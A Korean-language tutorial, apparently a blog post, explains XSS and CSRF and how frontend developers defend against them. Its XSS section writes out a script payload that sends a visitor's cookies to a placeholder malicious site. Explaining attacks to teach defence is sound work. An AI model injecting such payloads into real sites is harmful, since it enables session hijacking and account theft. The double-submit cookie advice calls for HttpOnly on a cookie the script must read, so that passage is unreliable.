# 1. 프론트엔드 주요 보안 이슈, XSS와 CSRF
  프론트엔드 개발에서 보안은 간과하기 쉬운 영역이지만, 웹 애플리케이션의 안전성과 사용자 데이터를 보호하기 위해 필수적인 요소이다. 특히 크로스 사이트 스크립팅(XSS)과 교차 사이트 요청 위조(CSRF)는 프론트엔드에서 자주 발생하는 주요 취약점으로, 각각 브라우저와 웹사이트 간의 신뢰 관계를 악용한다는 공통점이 있다.
  XSS는 "브라우저가 웹 사이트를 신뢰해서 생기는 취약점"이다. 사용자가 입력한 악성 스크립트가 브라우저에서 실행되면서, 사용자 세션 하이재킹이나 민감한 데이터 유출을 초래할 수 있다. 반면, CSRF는 "웹 사이트가 브라우저를 신뢰해서 생기는 취약점"이다. 공격자는 사용자가 인지하지 못한 상태에서 악의적인 요청을 웹 사이트로 전송하게 만들어, 사용자의 의도와 무관한 데이터 변경이나 작업이 이루어지도록 한다.
  보안 이슈가 지속적으로 발생하는 이유는 웹 애플리케이션이 갈수록 복잡해지며, 사용자의 상호작용이 더욱 많아지기 때문이다. 사용자와 서버 간의 데이터 전송이 빈번해질수록 악성 공격자가 이를 악용할 가능성도 커진다. 특히, 브라우저와 서버 간의 신뢰 관계는 공격자에게 손쉬운 목표가 되며, 이는 공격자가 단순한 취약점을 통해서도 심각한 결과를 초래할 수 있음을 의미한다. 따라서 XSS와 CSRF와 같은 취약점에 대한 방어는 모든 프론트엔드 개발자에게 중요한 과제로 자리잡고 있다.

<br>

# 2. 크로스 사이트 스크립팅 (XSS)

## 2.1. XSS란?
  크로스 사이트 스크립팅(XSS)은 웹 애플리케이션에서 빈번하게 발생하는 보안 취약점으로, 주로 사용자 입력을 적절히 검증하지 않을 때 발생한다. XSS는 악성 스크립트가 브라우저에서 실행되도록 하여, 공격자가 부적절한 콘텐츠를 표시하거나, 사용자의 권한을 도용하는 등 다양한 악의적인 행위를 가능하게 한다. 이러한 공격은 웹 애플리케이션이 사용자로부터 입력받은 데이터를 그대로 출력할 때 주로 발생한다. 특히 사용자 입력이 페이지 렌더링에 직접적으로 반영되는 환경에서 자주 문제가 된다.
  XSS 공격은 사용자와 웹 애플리케이션 간의 신뢰를 깨뜨리며, 공격자는 이러한 취약점을 악용해 웹사이트를 악성 코드로 가득 채울 수 있다. 공격자는 단순히 사용자 데이터에 접근하는 것뿐만 아니라, 웹 페이지의 기능을 교란시키거나 새로운 취약점을 발견해 추가적인 공격을 시도할 수 있다. 이러한 이유로 XSS는 사용자 데이터 보호뿐만 아니라 애플리케이션 전체의 보안을 강화하기 위해 반드시 방어해야 하는 중요한 문제이다.

## 2.2. XSS의 공격 예시
   XSS 공격은 매우 다양한 방식으로 나타날 수 있으며, 주로 웹 페이지에 악성 스크립트를 삽입하여 실행하는 형태로 발생한다. 예를 들어, 공격자가 XSS 취약점이 있는 블로그에 <script>alert('해킹됨');</script>와 같은 스크립트를 삽입하면, 이 페이지를 방문한 사용자는 경고 메시지를 보게 된다. 이러한 단순한 공격은 웹 페이지가 사용자 입력을 제대로 검증하지 않았을 때 발생할 수 있는 위험성을 잘 보여준다.
  이와 더불어, 공격자는 더 정교한 방법으로 사용자의 세션 쿠키를 탈취할 수 있다. 예를 들어, 쇼핑몰 리뷰 작성란에 <script>document.location='악성사이트?cookie='+document. cookie</script>와 같은 코드를 삽입하면, 이 리뷰를 읽는 사용자의 세션 정보가 공격자의 서버로 전송된다. 이를 통해 공격자는 사용자의 계정을 탈취하거나, 사용자 권한을 이용해 민감한 정보를 변경하는 등의 추가적인 악의적인 행위를 할 수 있다. 이러한 공격은 사용자 입력을 제대로 검증하지 않는 모든 웹 애플리케이션에서 발생할 수 있으며, 피해 규모는 매우 클 수 있다.
  또한, XSS 공격은 공격자가 웹 페이지의 신뢰성을 무너뜨리고, 사용자 경험을 크게 훼손할 수 있다. 사용자들은 악성 스크립트가 포함된 웹 페이지를 접하게 되면, 해당 웹사이트에 대한 신뢰를 잃고 이를 더 이상 이용하지 않게 될 가능성이 높다. 이처럼 XSS는 단순한 기술적 문제가 아니라, 비즈니스에 치명적인 타격을 줄 수 있는 심각한 위협이다.

## 2.3. XSS의 영향
  XSS는 다양한 방식으로 웹 애플리케이션과 사용자의 보안을 위협할 수 있다. 그중 가장 심각한 위협은 세션 하이재킹이다. 공격자는 사용자의 세션 쿠키를 탈취하여, 사용자가 로그인한 상태를 도용할 수 있다. 이를 통해 공격자는 사용자의 계정에 무단으로 접근해 민감한 정보에 접근하거나, 계정 설정을 변경하여 사용자에게 직접적인 피해를 줄 수 있다. 세션 하이재킹은 특히 전자 상거래 사이트나 금융 서비스와 같은 민감한 데이터를 다루는 사이트에서 매우 위험하다.
  또한, XSS는 악성 코드를 브라우저에서 실행함으로써 사용자의 시스템을 직접적으로 손상시킬 수 있다. 공격자는 피싱 사이트로 유도하는 스크립트를 삽입해 사용자의 자격 증명을 훔치거나, 키로거(Keylogger)를 설치해 사용자가 입력하는 모든 데이터를 기록할 수 있다. 이러한 방식은 사용자의 개인 정보나 금융 정보를 탈취하여, 큰 재정적 피해를 유발할 수 있다. XSS는 이러한 모든 공격을 가능하게 하는 중요한 경로를 제공한다.
  XSS는 웹 애플리케이션의 신뢰도를 심각하게 훼손할 수도 있다. 공격자가 웹사이트에 악성 스크립트를 삽입하게 되면, 사용자는 웹사이트를 신뢰하지 않게 되며, 이는 사이트의 평판에 치명적인 타격을 줄 수 있다. 사용자들은 악성 스크립트를 경험한 후 해당 사이트를 피하게 되고, 이는 비즈니스에 직접적인 영향을 미친다. XSS 공격은 이러한 경제적 손실까지 야기할 수 있는 심각한 보안 위협이다.

## 2.4. XSS 취약점 대책

### 1. 입력 데이터의 검증
  사용자 입력 데이터의 검증은 XSS 방지를 위한 가장 중요한 단계 중 하나이다. 웹 애플리케이션은 모든 사용자 입력을 신뢰해서는 안 되며, 입력된 데이터가 악의적인 의도를 가지고 있을 가능성을 항상 염두에 두어야 한다. 따라서, 모든 사용자 입력은 반드시 철저하게 검증되고, 필터링되어야 한다.
  첫 번째로, 사용자 입력을 HTML 콘텐츠에 직접 삽입하기 전에 특수 문자를 이스케이프 처리해야 한다. 이는 <, >, &, ", ' 등의 특수 문자가 HTML 태그나 속성으로 인식되는 것을 방지하기 위한 조치이다. 이러한 문자가 변환되지 않고 그대로 브라우저에 전달되면, 공격자가 삽입한 스크립트가 그대로 실행될 수 있기 때문이다. 예를 들어, <script> 태그와 같은 입력이 그대로 HTML에 삽입되면, 브라우저는 이를 스크립트로 인식하고 실행하게 된다. 이스케이프 처리를 통해 이러한 입력은 단순한 텍스트로 변환되어, 스크립트가 실행되지 않게 된다.
  또한, 입력 데이터의 길이와 유형을 제한하는 것도 중요하다. 예를 들어, 이메일 주소나 전화번호와 같이 명확한 형식이 필요한 입력의 경우, 정규 표현식을 사용해 입력된 데이터가 기대하는 형식에 맞는지 검증할 수 있다. 이렇게 함으로써, 공격자가 의도적으로 악성 코드를 입력하는 것을 사전에 차단할 수 있다. 또한, 필요 이상으로 긴 입력을 허용하지 않음으로써, 악의적인 스크립트가 대규모로 삽입되는 것을 방지할 수 있다.
  마지막으로, 서버와 클라이언트 측에서 모두 검증을 수행하는 것이 바람직하다. 클라이언트 측 검증은 사용자 경험을 개선하고 빠른 피드백을 제공할 수 있지만, 이를 우회하는 방법이 존재하기 때문에 서버 측에서도 반드시 추가 검증이 이루어져야 한다. 서버 측 검증은 최종 방어선으로서, 클라이언트 측에서 처리되지 않은 악성 입력이 서버에 도달하는 것을 막아줄 수 있다. 이를 통해 잠재적인 XSS 공격의 위험을 최소화할 수 있다.

### 2. HTML 요소 속성의 보호
  HTML 요소 속성에 사용자 데이터를 삽입할 때는 특별한 주의가 필요하다. 속성 값에 사용자 입력이 직접 삽입될 경우, 이는 XSS 공격에 노출될 수 있는 경로가 된다. 예를 들어, 사용자가 입력한 데이터가 href, src, title 등의 속성 값으로 사용될 때, 이 데이터를 반드시 따옴표로 감싸고, 이스케이프 처리를 통해 특수 문자가 코드로 실행되지 않도록 해야 한다. 이를 통해 공격자가 악의적인 스크립트를 삽입하는 것을 효과적으로 방지할 수 있다.
  특히 href 속성의 경우, 사용자가 입력한 URL이 http:나 https:로 시작하는지 확인해야 한다. 이를 통해 javascript:와 같은 악성 스키마가 사용되지 않도록 할 수 있다. 속성 값에 삽입되는 모든 입력 데이터는 신뢰할 수 없는 사용자로부터 입력된 것이므로, 철저한 검증과 필터링이 필요하다.

### 3. DOM 조작 보호
  DOM 조작 시에도 XSS 공격에 대한 방어가 중요하다. 사용자의 입력을 동적으로 HTML 요소에 삽입할 때, innerHTML과 같은 메서드는 가능한 한 사용하지 않아야 한다. 이 메서드는 입력된 HTML 코드가 그대로 파싱되어 실행되기 때문에, 악의적인 스크립트가 포함될 수 있다. 대신, appendChild, textContent, createElement 등의 메서드를 사용해 DOM을 조작하는 것이 안전하다.
  이러한 메서드는 입력된 데이터를 단순한 텍스트로 처리하거나, 요소를 명확하게 생성해 삽입하기 때문에, 공격자가 악성 스크립트를 주입하는 것을 방지할 수 있다. 또한, DOM 조작 과정에서 사용자 입력이 HTML 속성에 들어가는 경우, 반드시 앞서 언급한 대로 이스케이프 처리와 검증을 수행해야 한다. 이렇게 하면 동적으로 생성된 콘텐츠도 안전하게 렌더링할 수 있다.

### 4. Content Security Policy(CSP) 적용
  Content Security Policy(CSP)는 XSS와 같은 공격을 방지하기 위한 강력한 보안 메커니즘이다. CSP는 웹 애플리케이션이 실행할 수 있는 콘텐츠의 출처를 제어하여, 악의적인 스크립트가 브라우저에서 실행되는 것을 차단한다. 이를 통해 개발자는 자신이 신뢰하는 출처에서만 스크립트를 불러올 수 있도록 제한할 수 있으며, 인라인 스크립트나 외부 소스에서 로드되는 스크립트의 실행을 막을 수 있다.
  CSP를 적용할 때는 'unsafe-inline'과 같은 비안전한 지시자를 사용하지 않는 것이 중요하다. 대신 nonce-source나 hash-source를 사용하여 인라인 스크립트가 허용될 때도 안전하게 실행되도록 설정할 수 있다. 또한, 특정 리소스 유형에 대해 script-src, style-src, img-src 등의 지시자를 설정하여, 신뢰할 수 있는 출처에서만 해당 리소스를 로드하게끔 제어할 수 있다. 이를 통해 XSS를 포함한 다양한 코드 인젝션 공격을 예방할 수 있다.
  CSP는 테스트와 모니터링을 통해 지속적으로 개선되어야 한다. 초기에는 'Report-Only' 모드를 사용하여 CSP 설정이 제대로 작동하는지 확인하고, 문제점을 파악한 후에 실제 정책을 적용하는 것이 좋다. 또한, CSP는 설정 후에도 공격 시도가 발생할 경우 보고서를 수집하여, 새로운 위협에 대응할 수 있도록 지속적으로 관리해야 한다. 이렇게 함으로써, 웹 애플리케이션의 보안을 한층 강화할 수 있다.

### 5. XSS 예방 라이브러리 사용
  XSS를 효과적으로 방어하기 위해서는 검증된 라이브러리를 사용하는 것이 중요하다. DOMPurify와 같은 라이브러리는 사용자가 입력한 데이터를 철저히 필터링하여, 잠재적으로 위험한 HTML 태그와 속성을 제거함으로써 XSS 공격을 방지한다. 이 라이브러리는 사용하기 간편하면서도 강력한 보호 기능을 제공하여, 개발자가 안전하게 사용자 콘텐츠를 처리할 수 있도록 돕는다.
  DOMPurify는 다양한 설정 옵션을 제공하여 개발자가 애플리케이션의 요구에 맞게 필터링 규칙을 커스터마이즈할 수 있다. 예를 들어, 특정 태그나 속성만 허용하거나, 스크립트와 같이 악성 코드가 포함될 수 있는 요소를 완전히 제거하는 식으로 설정할 수 있다. 이를 통해 애플리케이션의 보안 수준을 높이고, 사용자가 악의적인 입력을 통해 시스템에 해를 끼치는 것을 방지할 수 있다.
  최신 웹 브라우저에서 제공하는 Sanitizer API를 활용하는 것도 좋은 방법이다. Sanitizer API는 브라우저 내장 보안 기능으로, XSS와 같은 보안 위협으로부터 사용자를 보호하기 위해 고안되었다. 이 API는 브라우저 레벨에서 콘텐츠를 안전하게 처리하며, 사용자 입력을 DOM에 삽입하기 전에 자동으로 검증한다. 이러한 도구를 활용하면, 개발자는 XSS와 같은 취약점을 보다 효과적으로 방어할 수 있다.

<br>

# 3. 교차 사이트 요청 위조 (CSRF)

## 3.1. CSRF란?
  교차 사이트 요청 위조(CSRF)는 사용자가 신뢰하는 웹사이트에 대해 사용자의 의도와는 다른 악성 요청을 유도하는 공격 기법이다. 주로 사용자가 이미 로그인된 상태에서 발생하며, 공격자는 피해자의 브라우저를 통해 요청을 보내고, 서버는 이를 신뢰된 사용자로부터 온 것으로 간주한다. 서버는 요청의 진위를 판별하지 못하고 민감한 작업을 수행할 수 있다. 이러한 공격은 사용자의 행동이 전혀 개입되지 않더라도 악성 페이지 방문만으로도 실행될 수 있어 매우 위험하다.
  CSRF 공격은 브라우저의 신뢰성과 사용자의 세션 상태를 악용해 이루어진다. 공격자는 자주 사용하는 웹사이트나 신뢰할 수 있는 페이지에 악성 코드를 숨겨두거나, 이메일 링크를 조작하여 사용자가 클릭하도록 유도한다. 특히, 사용자가 아무 의심 없이 웹사이트를 탐색하는 동안 공격자는 민감한 작업을 자동으로 수행하게 하며, 사용자와 서버 간의 신뢰 관계를 무너뜨린다.
  이러한 공격은 특히 금융 거래, 소셜 미디어, 전자 상거래 사이트에서 위험하다. 공격자가 사용자 대신 자금 이체 요청을 하거나, 계정 정보를 변경하는 경우, 사용자는 해당 사실을 전혀 인지하지 못한 채 피해를 입을 수 있다. 따라서, CSRF는 모든 프론트엔드 개발자가 반드시 방어해야 할 주요 보안 위협으로 자리 잡고 있다.

## 3.2. CSRF의 공격 예시
  CSRF 공격은 다양한 상황에서 발생할 수 있다. 대표적인 예로, 사용자가 로그인된 상태에서 악성 링크를 클릭하는 경우를 들 수 있다. 공격자는 사용자가 자주 방문하는 커뮤니티 사이트나 포럼에 악성 링크를 게시하고, 사용자가 클릭하면 브라우저는 해당 사용자가 이미 로그인한 상태에서 악성 요청을 실행하게 된다. 예를 들어, 인터넷 뱅킹 웹사이트에서 사용자가 클릭한 링크가 계좌 이체 요청을 발생시키는 것이다. 이때 서버는 사용자의 세션 쿠키를 기반으로 요청을 합법적으로 처리해, 사용자 계좌에서 자금이 이체될 수 있다.
  또 다른 예시로는 이메일 링크를 통해 CSRF 공격이 발생하는 경우가 있다. 사용자가 공격자가 보낸 악성 이메일을 열어 그 안의 링크를 클릭하면, 사용자가 로그인한 상태인 전자 상거래 사이트에서 자동으로 주문이 생성되거나, 배송 주소가 변경되는 등의 악의적인 요청이 발생한다. 이 경우, 사용자는 자신의 브라우저에서 발생하는 요청을 신뢰하므로 아무런 경고 없이 피해를 입게 된다.
  이처럼, CSRF 공격은 사용자가 자신의 브라우저에서 실행되는 모든 요청을 통제할 수 없다는 점에서 특히 치명적이다. 공격자는 사용자가 신뢰하는 웹사이트에서 사용자의 자산을 빼돌리거나 계정 권한을 도용할 수 있으며, 이는 사용자가 의도하지 않은 결과를 초래할 수 있다.

## 3.3. CSRF의 영향
  CSRF 공격은 사용자와 웹 애플리케이션 모두에게 심각한 영향을 미칠 수 있다. 특히 금융 서비스에서 CSRF가 발생하면, 공격자는 사용자의 의도와는 상관없이 자금을 이체하거나 민감한 정보를 수정할 수 있다. 사용자는 자신이 전혀 알지 못한 상태에서 큰 재정적 피해를 입을 수 있으며, 피해 규모가 클 경우 회복하기 어려운 경제적 손실을 초래할 수 있다.
  이 공격은 또한 소셜 미디어나 이메일 서비스와 같은 개인 정보 관리 시스템에서도 위험하다. 공격자가 사용자의 계정으로 무단 게시물을 작성하거나, 사용자의 동의 없이 비밀번호를 변경해 계정을 탈취할 수 있다. 이는 사용자의 온라인 정체성을 위협하며, 공격자가 의도한 콘텐츠가 사용자의 이름으로 퍼지면서 개인적, 사회적으로도 심각한 문제를 일으킬 수 있다.
  CSRF는 단순히 개인의 피해를 넘어서, 웹 애플리케이션의 신뢰성 자체를 심각하게 훼손할 수 있다. 공격이 발생한 후, 사용자는 해당 웹사이트나 서비스에 대한 신뢰를 잃고, 더 이상 이용하지 않을 가능성이 크다. 이는 웹 애플리케이션의 비즈니스에 직접적인 타격을 줄 수 있으며, 고객 이탈로 이어져 장기적인 경제적 손실을 야기할 수 있다. 이러한 이유로 CSRF는 예방과 방어가 매우 중요한 보안 문제이다.

## 3.4. CSRF 취약점 대책

### 1. CSRF 토큰 사용
  CSRF 방어의 핵심 전략 중 하나는 원타임 토큰(One-Time Token)을 활용하여 요청과 서버 간의 일치 여부를 검증하는 것이다. 이 토큰은 서버가 사용자 세션에 고유하게 생성한 값으로, 각 요청마다 포함되어야 한다. 서버는 요청을 처리하기 전에 이 토큰이 유효한지 확인한다. 이를 통해 서버는 요청이 사용자의 브라우저에서 직접 발생했는지, 또는 외부에서 조작된 것인지를 검증할 수 있다.
  CSRF 토큰은 주로 폼에 숨김 필드로 포함된다. 사용자가 폼을 제출하면, 토큰이 함께 전송되어 서버에서 검증된다. 이렇게 함으로써 공격자가 외부에서 동일한 요청을 모방하더라도, 유효한 토큰이 없으면 요청이 처리되지 않는다. 이는 사용자가 정상적인 경로를 통해 요청을 보냈는지를 확인하는 중요한 보안 절차이다.
  이 토큰은 단순한 값이 아니라, 복잡하고 예측 불가능한 값이어야 하며, 매 세션마다 변경되는 것이 바람직하다. 세션이 시작될 때마다 새로운 토큰이 생성되거나, 각 요청 시마다 새롭게 발급되어야 한다. 이렇게 하면 공격자가 특정 토큰을 획득하더라도 이를 재사용할 수 없게 되어, CSRF 공격의 성공 가능성을 크게 낮출 수 있다. 이는 CSRF 공격을 방지하는 데 있어 중요한 보안 계층을 추가하는 역할을 한다.화할 수 있다.

### 2. SameSite Cookie 속성 사용
  CSRF 공격을 방지하는 또 다른 중요한 방법은 쿠키의 SameSite 속성을 사용하는 것이다. 이 속성은 쿠키가 요청과 함께 전송되는 방식을 제어하여, 교차 사이트 요청이 쿠키를 포함할 수 없도록 제한한다. SameSite 속성은 Lax, Strict, 또는 None으로 설정할 수 있으며, 기본적으로는 Lax로 설정하여 대부분의 경우에 안전한 보호를 제공한다.
  SameSite=Lax는 사용자가 링크를 클릭하거나 GET 요청을 통해 사이트를 탐색할 때 쿠키가 전송되도록 허용하지만, POST 요청과 같은 민감한 작업에는 쿠키가 포함되지 않도록 한다. 이는 사용자가 외부 사이트에서 특정 링크를 클릭하는 일반적인 사용 사례를 보호하면서도, CSRF 공격의 가능성을 줄이는 데 효과적이다. SameSite=Strict로 설정하면, 모든 외부 요청에 대해 쿠키가 전송되지 않아, CSRF 공격에 대한 보호가 더욱 강화된다.
  하지만, SameSite=Strict는 사용자 경험에 영향을 미칠 수 있어, 모든 상황에서 적합하지는 않다. 반면, SameSite=Lax는 보안과 사용자 경험의 균형을 잘 맞추는 옵션으로, 대부분의 웹 애플리케이션에서 권장된다. 특정 상황에서는 SameSite=None을 사용하여 쿠키가 교차 사이트 요청에서도 전송되도록 설정할 수 있지만, 이 경우 반드시 Secure 속성도 함께 사용하여 HTTPS 연결에서만 쿠키가 전송되도록 해야 한다. 이를 통해 CSRF 공격에 대한 강력한 방어를 유지하면서도, 필요한 경우 유연성을 제공할 수 있다.

### 3. Double Submit Cookie 기법
  Double Submit Cookie 기법은 CSRF 공격을 방어하기 위한 효과적인 방법 중 하나로, CSRF 토큰을 두 번 제출하는 방식을 사용한다. 이 기법에서는 서버가 사용자의 브라우저에 CSRF 토큰을 포함하는 쿠키를 발급하고, 클라이언트는 이 토큰을 폼 데이터나 요청 헤더에 포함시켜 서버에 다시 전송한다. 서버는 요청이 들어오면, 쿠키에 저장된 토큰과 폼이나 헤더에 포함된 토큰이 일치하는지 확인한다.
  이 방법은 서버가 CSRF 토큰을 관리하는 방식과 달리, 쿠키와 폼 데이터 간의 일치 여부를 검사하여 CSRF 공격을 방어한다. 공격자는 CSRF 토큰이 포함된 쿠키를 위조할 수 없으며, 일치하는 토큰 값을 알지 못하기 때문에, 이 기법은 CSRF 공격을 효과적으로 차단한다. 또한, 이 기법은 서버 측에서 특별한 상태 정보를 유지할 필요가 없어 구현이 비교적 간단하다.
  하지만 Double Submit Cookie 기법은 쿠키의 보안 설정이 중요하다. 쿠키가 JavaScript에서 접근 가능하지 않도록 HttpOnly 속성을 사용해야 하며, Secure 속성을 통해 HTTPS 연결에서만 쿠키가 전송되도록 설정해야 한다. 이러한 보안 설정을 통해 쿠키가 클라이언트 측에서 노출되는 것을 방지하고, CSRF 공격에 대한 방어력을 더욱 강화할 수 있다.

### 4. 출처 검증
  CSRF 공격을 방지하는 또 다른 중요한 방법은 출처 검증(Origin Verification)이다. 출처 검증은 서버가 요청의 출처(Origin)와 Referer 헤더를 확인하여, 요청이 신뢰할 수 있는 출처에서 온 것인지 판단하는 방식이다. 웹 브라우저는 요청을 보낼 때 출처와 Referer 헤더를 자동으로 포함시키며, 서버는 이를 바탕으로 요청의 유효성을 검사할 수 있다.
  출처 검증은 특히 중요한 작업에서 유용하다. 예를 들어, 민감한 데이터 수정이나 결제 요청과 같은 작업에서 출처가 올바른지 확인함으로써, 외부 사이트에서 발생한 의도하지 않은 요청을 차단할 수 있다. 이 방법은 CSRF 공격을 사전에 방어하는 강력한 수단이 된다.
  이 방식의 핵심은, 서버가 허가된 출처 리스트를 유지하고, 그 리스트에 포함되지 않은 출처에서 온 요청은 모두 거부하는 것이다. 이를 통해, 공격자가 임의의 사이트에서 보내는 CSRF 요청이 효과를 발휘하지 못하도록 막을 수 있다. 그러나, Referer 헤더는 일부 환경에서 제거되거나 수정될 수 있으므로, 출처 검증은 CSRF 방어 전략의 하나로 사용되며, 다른 방법들과 함께 적용하는 것이 권장된다.
